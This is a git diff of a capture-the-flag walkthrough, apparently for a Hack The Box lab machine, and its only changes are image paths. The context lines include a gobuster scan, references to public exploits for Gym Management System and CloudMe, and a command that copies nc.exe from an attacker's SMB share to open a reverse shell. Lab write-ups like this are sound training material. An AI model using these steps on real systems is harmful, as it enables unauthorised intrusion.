@@ -26,7 +26,7 @@ There is a website on port 8080, so I started going thorugh it and meantime I ra
 gobuster dir --url http://10.10.10.198:8080/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x .txt,.php,.html 
 ```
 On the website ```Contact``` Tab I saw this:
-![[Pasted image 20230107213809.png]]
+![[images/buff/Pasted image 20230107213809.png]]
 
 I searched online and found an exploit on [Exploit-DB](https://www.exploit-db.com/exploits/48506):
 
@@ -34,7 +34,7 @@ I searched online and found an exploit on [Exploit-DB](https://www.exploit-db.co
 Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.
 
 **Initial shell Proof**
-![[Pasted image 20230107214338.png]]
+![[images/buff/Pasted image 20230107214338.png]]
 
 Since it is a web shell I was limited and couldn't move from the current directory I was in, so I moved ```nc.exe``` to the target machine, and created a reverse shell.
 ```
@@ -51,7 +51,7 @@ copy \\10.10.14.2\kali\nc.exe
 # Privilege Escalation
 
 First, I enumerated the machine manually, and while grabbing the ```user.txt``` flag I saw this:
-![[Pasted image 20230107214936.png]]
+![[images/buff/Pasted image 20230107214936.png]]
 ```CloudMe_1112``` looked like something worth checking, and I found online a BOF (Buffer OverFlow) exploit on [Exploit-DB](https://www.exploit-db.com/exploits/48389)
 
 I checked the ```netstat``` to see if it was really listening to this ```CloudMe``` service, and it was listening to two ports:
@@ -100,4 +100,4 @@ I replaced the original payload with the modified one, listened to port 1234 on 
 ```
 
 And it worked:
-![[Pasted image 20230107220850.png]]
+![[images/buff/Pasted image 20230107220850.png]]
